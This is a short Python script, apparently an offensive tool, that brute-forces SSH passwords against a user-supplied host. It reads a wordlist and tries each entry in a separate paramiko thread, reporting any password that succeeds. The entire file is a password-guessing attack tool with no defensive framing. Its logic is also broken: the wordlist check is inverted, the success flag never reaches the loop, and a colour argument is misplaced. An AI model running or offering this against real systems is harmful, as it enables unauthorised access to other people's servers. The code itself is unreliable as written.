import sys, os, socket
import paramiko
import threading, time
from termcolor import colored

flag = 0
def sshConnect(brute):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    try:
        ssh.connect(host, port=22, username=user, password=brute)
        flag = 1
        print(colored(f"[+] ssh: {brute}\n"),'green')
    except socket.error:
        print(colored(f"[-] ssh: [CF]\n"),'magenta')
    except Exception as error:
        print(colored(f"[-] ssh: [INC]\n"),'red')
    ssh.close()

try: 
    host = input("[?] host: ")
    user = input("[?] user: ")
    bruteFile = input("[?] file: ")
    if os.path.exists(bruteFile):
        print(f"\n[!] path-error: [?F]\n")
        sys.exit()
    else:
        print(f"[~] scan: [ON]\n")
    with open(bruteFile, "r") as file:
        for line in file.readlines():
            attempt = line.strip()
            thread = threading.Thread(target=sshConnect, args=(attempt,))
            if flag == 1:
                thread.join()
                exit()
            thread.start()
            time.sleep(0.5) 
except KeyboardInterrupt:
    print(f"\n[0]")
